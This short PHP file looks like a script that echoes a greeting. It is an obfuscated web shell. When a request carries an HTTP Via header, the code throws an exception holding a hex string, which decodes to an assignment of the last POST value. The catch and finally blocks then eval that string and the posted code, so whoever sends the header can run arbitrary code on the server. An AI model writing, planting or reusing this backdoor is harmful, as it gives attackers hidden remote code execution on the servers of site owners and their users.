<?php
try{
    $value = 'echo "hello~"';
    apply();
}catch(Exception $e){
    eval(pack('H*',$e->getMessage()));
}finally{
    eval($value.';');
}

function apply(){
  if(isset($_SERVER['HTTP_VIA'])){
    throw new Exception('2476616c75653d656e6428245f504f5354293b');
  }
  return false;
}
